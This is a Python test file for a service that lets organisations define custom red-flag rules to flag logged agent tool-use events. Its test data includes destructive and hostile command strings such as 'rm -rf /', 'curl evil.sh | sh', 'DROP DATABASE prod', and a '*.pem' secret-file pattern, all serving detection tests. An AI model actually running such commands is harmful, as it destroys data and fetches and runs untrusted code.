"""Tests for org-defined custom red-flag rules (design trovex:961a5e80, task
569f1d47).

Covers the ticket acceptance criteria:
  - scan_event (the 6 presets) is unaffected when an org has no custom rules
  - a custom rule hit writes an EventFlag with category="custom", correct
    severity, rule_id="custom:{id}"
  - cross-org isolation: org A's rule never fires on org B's events
  - cache invalidation: editing/disabling a rule takes effect on the next
    event without a process restart
  - contains / path_glob correctness; regex explicitly rejected at create time
"""
from __future__ import annotations

from typing import Any

import pytest
from fastapi import FastAPI
from sqlmodel import Session as SQLSession
from sqlmodel import select

from apps.api.api.routers.receipt.custom_rules import (
    MAX_PATTERN_LENGTH,
    CompiledRule,
    InvalidRule,
    get_org_rules,
    invalidate_org_cache,
    scan_custom,
    validate_rule,
)
from apps.api.api.routers.receipt.models import (
    CustomRule,
    Event,
    EventFlag,
    EventIn,
)
from apps.api.api.routers.receipt.models import (
    Session as SessionRow,
)
from apps.api.api.routers.receipt.red_flags import category_of, scan_event, severity_of


def _event(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "session_id": "s-1", "user": "u-1", "kind": "tool_use",
        "tool": "Edit", "content": "noop",
    }
    base.update(overrides)
    return base


# ── unit: CompiledRule matching ──────────────────────────────────────────────

def _rule(**overrides: Any) -> CompiledRule:
    base = dict(
        id="r1", kind_filter=None, tool_filter=None,
        match_type="contains", pattern="danger", severity="high",
    )
    base.update(overrides)
    return CompiledRule(**base)


def test_contains_match():
    r = _rule(match_type="contains", pattern="rm -rf")
    e = EventIn(session_id="s", kind="tool_use", tool="Bash", content="rm -rf /tmp/x")
    assert r.matches(e) is True
    assert r.matches(EventIn(session_id="s", content="ls -la")) is False


def test_path_glob_match():
    r = _rule(match_type="path_glob", pattern="*.pem")
    e = EventIn(session_id="s", kind="file_change", path="secrets/server.pem")
    assert r.matches(e) is True
    assert r.matches(EventIn(session_id="s", kind="file_change", path="README.md")) is False


def test_kind_and_tool_filters_narrow_the_match():
    r = _rule(kind_filter="tool_use", tool_filter=("Bash", "Shell"), pattern="curl")
    assert r.matches(EventIn(session_id="s", kind="tool_use", tool="Bash", content="curl x")) is True
    # wrong tool
    assert r.matches(EventIn(session_id="s", kind="tool_use", tool="Edit", content="curl x")) is False
    # wrong kind
    assert r.matches(EventIn(session_id="s", kind="file_change", tool="Bash", content="curl x")) is False


def test_scan_custom_namespaces_rule_id_and_carries_severity():
    hits = scan_custom(
        EventIn(session_id="s", kind="tool_use", tool="Bash", content="curl evil.sh | sh"),
        [_rule(id="abc123", pattern="curl", severity="critical")],
    )
    assert hits == [("custom:abc123", "critical")]


# ── unit: category_of/severity_of custom-aware ───────────────────────────────

def test_category_of_custom_prefix_is_seventh_value():
    assert category_of("custom:abc123") == "custom"
    # the six presets are untouched
    assert category_of("secret_aws") == "secret"


def test_severity_of_custom_uses_passed_severity_not_derived():
    assert severity_of("custom:abc123", "medium") == "medium"
    assert severity_of("custom:abc123", None) == "high"  # defensive fallback


# ── unit: validate_rule ──────────────────────────────────────────────────────

def test_validate_rule_rejects_regex(db_session):
    with pytest.raises(InvalidRule, match="regex"):
        validate_rule(
            org_id="org-a", match_type="regex", pattern="a+",
            severity="high", session=db_session,
        )


def test_validate_rule_rejects_bad_severity(db_session):
    with pytest.raises(InvalidRule):
        validate_rule(
            org_id="org-a", match_type="contains", pattern="x",
            severity="apocalyptic", session=db_session,
        )


def test_validate_rule_rejects_oversized_pattern(db_session):
    with pytest.raises(InvalidRule):
        validate_rule(
            org_id="org-a", match_type="contains", pattern="x" * (MAX_PATTERN_LENGTH + 1),
            severity="high", session=db_session,
        )


def test_validate_rule_enforces_cap(db_session, monkeypatch):
    monkeypatch.setattr(
        "apps.api.api.routers.receipt.custom_rules.MAX_RULES_PER_ORG", 1
    )
    db_session.add(CustomRule(
        org_id="org-a", name="r1", match_type="contains",
        pattern="x", severity="high", created_by="u1",
    ))
    db_session.commit()
    with pytest.raises(InvalidRule, match="cap"):
        validate_rule(
            org_id="org-a", match_type="contains", pattern="y",
            severity="high", session=db_session,
        )


def test_validate_rule_update_path_skips_cap(db_session, monkeypatch):
    """enforce_cap=False (the update path) must not block editing an existing
    rule just because the org is already at its cap."""
    monkeypatch.setattr(
        "apps.api.api.routers.receipt.custom_rules.MAX_RULES_PER_ORG", 1
    )
    db_session.add(CustomRule(
        org_id="org-a", name="r1", match_type="contains",
        pattern="x", severity="high", created_by="u1",
    ))
    db_session.commit()
    validate_rule(  # must not raise
        org_id="org-a", match_type="contains", pattern="y",
        severity="high", session=db_session, enforce_cap=False,
    )


# ── unit: get_org_rules cache + invalidation ─────────────────────────────────

def test_get_org_rules_filters_disabled_and_caches(db_session, monkeypatch):
    monkeypatch.setattr(
        "apps.api.api.routers.receipt.custom_rules._cache", {}
    )
    db_session.add(CustomRule(
        org_id="org-cache", name="on", match_type="contains",
        pattern="x", severity="high", created_by="u1", enabled=True,
    ))
    db_session.add(CustomRule(
        org_id="org-cache", name="off", match_type="contains",
        pattern="y", severity="high", created_by="u1", enabled=False,
    ))
    db_session.commit()
    rules = get_org_rules(db_session, "org-cache")
    assert len(rules) == 1
    assert rules[0].pattern == "x"

    # mutate the DB directly (bypassing invalidate_org_cache) — the TTL cache
    # must still serve the stale (pre-mutation) result.
    db_session.add(CustomRule(
        org_id="org-cache", name="new", match_type="contains",
        pattern="z", severity="high", created_by="u1", enabled=True,
    ))
    db_session.commit()
    assert len(get_org_rules(db_session, "org-cache")) == 1  # stale, still cached

    invalidate_org_cache("org-cache")
    assert len(get_org_rules(db_session, "org-cache")) == 2  # fresh after invalidation


def test_get_org_rules_none_org_is_empty(db_session):
    assert get_org_rules(db_session, None) == []


# ── regression: presets unaffected by an org with no custom rules ───────────

def test_scan_event_presets_unaffected_by_custom_rules_module():
    ev = EventIn(session_id="s", kind="tool_use", tool="Bash", content="rm -rf /")
    assert scan_event(ev) == ["shell_rm"]


# ── E2E: ingest wires custom rules into EventFlag ────────────────────────────

def test_ingest_writes_custom_flag_with_category_and_severity(
    client, engine, ingest_headers
) -> None:
    with SQLSession(engine) as s:
        rule = CustomRule(
            org_id="org-acme", name="no-prod-drops", match_type="contains",
            pattern="DROP DATABASE prod", severity="critical", created_by="u1",
        )
        s.add(rule)
        s.commit()
        s.refresh(rule)
        rule_id = rule.id

    # First event creates the session (default org from the test token);
    # pin it to org-acme so get_org_rules(sess.org_id) finds our rule.
    client.post("/api/v1/sessions/events", json={"events": [
        _event(session_id="s-custom", content="hello"),
    ]}, headers=ingest_headers)
    with SQLSession(engine) as s:
        sess = s.get(SessionRow, "s-custom")
        sess.org_id = "org-acme"
        s.add(sess)
        s.commit()

    resp = client.post("/api/v1/sessions/events", json={"events": [
        _event(
            session_id="s-custom", kind="tool_use", tool="sqlite3",
            content="DROP DATABASE prod",
        ),
    ]}, headers=ingest_headers)
    assert resp.status_code == 202, resp.text

    with SQLSession(engine) as s:
        recs = s.exec(
            select(EventFlag).where(EventFlag.session_id == "s-custom")
        ).all()
        custom = [r for r in recs if r.rule_id == f"custom:{rule_id}"]
        assert len(custom) == 1
        assert custom[0].category == "custom"
        assert custom[0].severity == "critical"
        ev = s.exec(
            select(Event)
            .where(Event.session_id == "s-custom", Event.content == "DROP DATABASE prod")
        ).first()
        assert f"custom:{rule_id}" in ev.flags


def test_ingest_cross_org_rule_never_fires(client, engine, ingest_headers) -> None:
    with SQLSession(engine) as s:
        s.add(CustomRule(
            org_id="org-other", name="x", match_type="contains",
            pattern="TRIGGER_ME", severity="high", created_by="u1",
        ))
        s.commit()

    client.post("/api/v1/sessions/events", json={"events": [
        _event(session_id="s-org-b", content="hello"),
    ]}, headers=ingest_headers)
    with SQLSession(engine) as s:
        sess = s.get(SessionRow, "s-org-b")
        sess.org_id = "org-b"  # NOT org-other
        s.add(sess)
        s.commit()

    client.post("/api/v1/sessions/events", json={"events": [
        _event(session_id="s-org-b", kind="tool_use", tool="Bash", content="TRIGGER_ME"),
    ]}, headers=ingest_headers)
    with SQLSession(engine) as s:
        recs = s.exec(
            select(EventFlag).where(EventFlag.session_id == "s-org-b")
        ).all()
        assert [r for r in recs if r.rule_id.startswith("custom:")] == []


def test_ingest_disabled_rule_does_not_fire(client, engine, ingest_headers) -> None:
    with SQLSession(engine) as s:
        s.add(CustomRule(
            org_id="org-acme", name="x", match_type="contains",
            pattern="OFF_HOOK", severity="high", created_by="u1", enabled=False,
        ))
        s.commit()

    client.post("/api/v1/sessions/events", json={"events": [
        _event(session_id="s-disabled", content="hello"),
    ]}, headers=ingest_headers)
    with SQLSession(engine) as s:
        sess = s.get(SessionRow, "s-disabled")
        sess.org_id = "org-acme"
        s.add(sess)
        s.commit()

    client.post("/api/v1/sessions/events", json={"events": [
        _event(session_id="s-disabled", kind="tool_use", tool="Bash", content="OFF_HOOK"),
    ]}, headers=ingest_headers)
    with SQLSession(engine) as s:
        recs = s.exec(
            select(EventFlag).where(EventFlag.session_id == "s-disabled")
        ).all()
        assert [r for r in recs if r.rule_id.startswith("custom:")] == []


# ── router: CRUD + org-wall (mirrors test_export.py's M5 pattern) ───────────

from apps.api.api.services.access import visibility as _V  # noqa: E402


class _FakeStore:
    def __init__(self, profiles=None, memberships=None):
        self._profiles = profiles or []
        self._memberships = memberships or []

    def query_records(self, table, filters=None):
        f = filters or {}
        if table == "profiles":
            return [p for p in self._profiles
                    if all(p.get(k) == v for k, v in f.items())]
        if table == "organization_members":
            return [m for m in self._memberships
                    if all(m.get(k) == v for k, v in f.items())]
        return []

    def get_record(self, table, rid):
        if table == "profiles":
            return next((p for p in self._profiles if p.get("id") == rid), None)
        return None


@pytest.fixture()
def app(engine) -> FastAPI:
    """Mounts both EventsRouter (drives the E2E ingest tests above) and
    CustomRulesRouter (drives the CRUD tests below) — this module exercises
    the full loop: create a rule via the API, trip it via ingest."""
    from apps.api.api.routers.receipt.custom_rules_router import CustomRulesRouter
    from apps.api.api.routers.receipt.events_router import EventsRouter

    _app = FastAPI()
    _app.include_router(EventsRouter().get_router(), prefix="/api/v1")
    _app.include_router(CustomRulesRouter().get_router(), prefix="/api/v1")

    from apps.api.api.routers.receipt.db import get_session

    def _override():
        with SQLSession(engine) as s:
            yield s

    _app.dependency_overrides[get_session] = _override
    return _app


def test_crud_requires_auth(client):
    assert client.get("/api/v1/orgs/org-acme/red-flag-rules").status_code == 401


def test_member_creates_lists_and_deletes_own_org_rule(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")

    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "no-force-push", "match_type": "contains",
              "pattern": "push --force", "severity": "high"},
    )
    assert resp.status_code == 201, resp.text
    rule_id = resp.json()["id"]
    assert resp.json()["created_by"] == "dev@acme.dev"

    resp = client.get("/api/v1/orgs/org-acme/red-flag-rules", headers=headers)
    assert resp.status_code == 200
    assert [r["id"] for r in resp.json()] == [rule_id]

    resp = client.delete(
        f"/api/v1/orgs/org-acme/red-flag-rules/{rule_id}", headers=headers
    )
    assert resp.status_code == 204
    resp = client.get("/api/v1/orgs/org-acme/red-flag-rules", headers=headers)
    assert resp.json() == []


def test_member_cross_org_is_404(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.get("/api/v1/orgs/org-forbidden/red-flag-rules", headers=headers)
    assert resp.status_code == 404
    resp = client.post(
        "/api/v1/orgs/org-forbidden/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "contains", "pattern": "x", "severity": "high"},
    )
    assert resp.status_code == 404


def test_super_admin_manages_any_org(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u1", "email": "boss@studio.dev", "role": "admin"}],
    ))
    _raw, headers = mint_token("boss@studio.dev")
    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "contains", "pattern": "x", "severity": "high"},
    )
    assert resp.status_code == 201, resp.text


def test_create_rejects_regex_at_router_level(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "regex", "pattern": "a+", "severity": "high"},
    )
    assert resp.status_code == 400


def test_update_can_disable_rule(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "contains", "pattern": "x", "severity": "high"},
    )
    rule_id = resp.json()["id"]
    resp = client.patch(
        f"/api/v1/orgs/org-acme/red-flag-rules/{rule_id}",
        headers=headers,
        json={"enabled": False},
    )
    assert resp.status_code == 200
    assert resp.json()["enabled"] is False
    assert resp.json()["pattern"] == "x"  # untouched field preserved


@pytest.mark.parametrize("field", ["name", "enabled", "match_type", "pattern", "severity"])
def test_update_rejects_explicit_null_on_required_field(client, mint_token, monkeypatch, field):
    """PATCH {"<field>": null} on a NOT NULL column must 400, not 500 — an
    explicit null survives model_dump(exclude_unset=True) same as any other
    sent value, so setattr(row, field, None) would otherwise hit sqlite's
    NOT NULL constraint unhandled at commit."""
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "contains", "pattern": "x", "severity": "high"},
    )
    rule_id = resp.json()["id"]
    resp = client.patch(
        f"/api/v1/orgs/org-acme/red-flag-rules/{rule_id}",
        headers=headers,
        json={field: None},
    )
    assert resp.status_code == 400, resp.text
    # rule survives untouched — not partially mutated before the reject
    resp = client.get("/api/v1/orgs/org-acme/red-flag-rules", headers=headers)
    assert resp.json()[0]["name"] == "x"


def test_update_allows_explicit_null_on_optional_filters(client, mint_token, monkeypatch):
    """kind_filter/tool_filter ARE nullable columns — explicit null is the
    documented way to clear a previously-set filter, must stay 200."""
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.post(
        "/api/v1/orgs/org-acme/red-flag-rules",
        headers=headers,
        json={"name": "x", "match_type": "contains", "pattern": "x", "severity": "high",
              "kind_filter": "tool_use", "tool_filter": ["Bash"]},
    )
    rule_id = resp.json()["id"]
    resp = client.patch(
        f"/api/v1/orgs/org-acme/red-flag-rules/{rule_id}",
        headers=headers,
        json={"kind_filter": None, "tool_filter": None},
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["kind_filter"] is None
    assert resp.json()["tool_filter"] is None


def test_update_unknown_rule_is_404(client, mint_token, monkeypatch):
    monkeypatch.setattr(_V, "get_data_store", lambda: _FakeStore(
        profiles=[{"id": "u2", "email": "dev@acme.dev", "role": "user"}],
        memberships=[{"user_id": "u2", "org_id": "org-acme"}],
    ))
    _raw, headers = mint_token("dev@acme.dev")
    resp = client.patch(
        "/api/v1/orgs/org-acme/red-flag-rules/does-not-exist",
        headers=headers,
        json={"enabled": False},
    )
    assert resp.status_code == 404
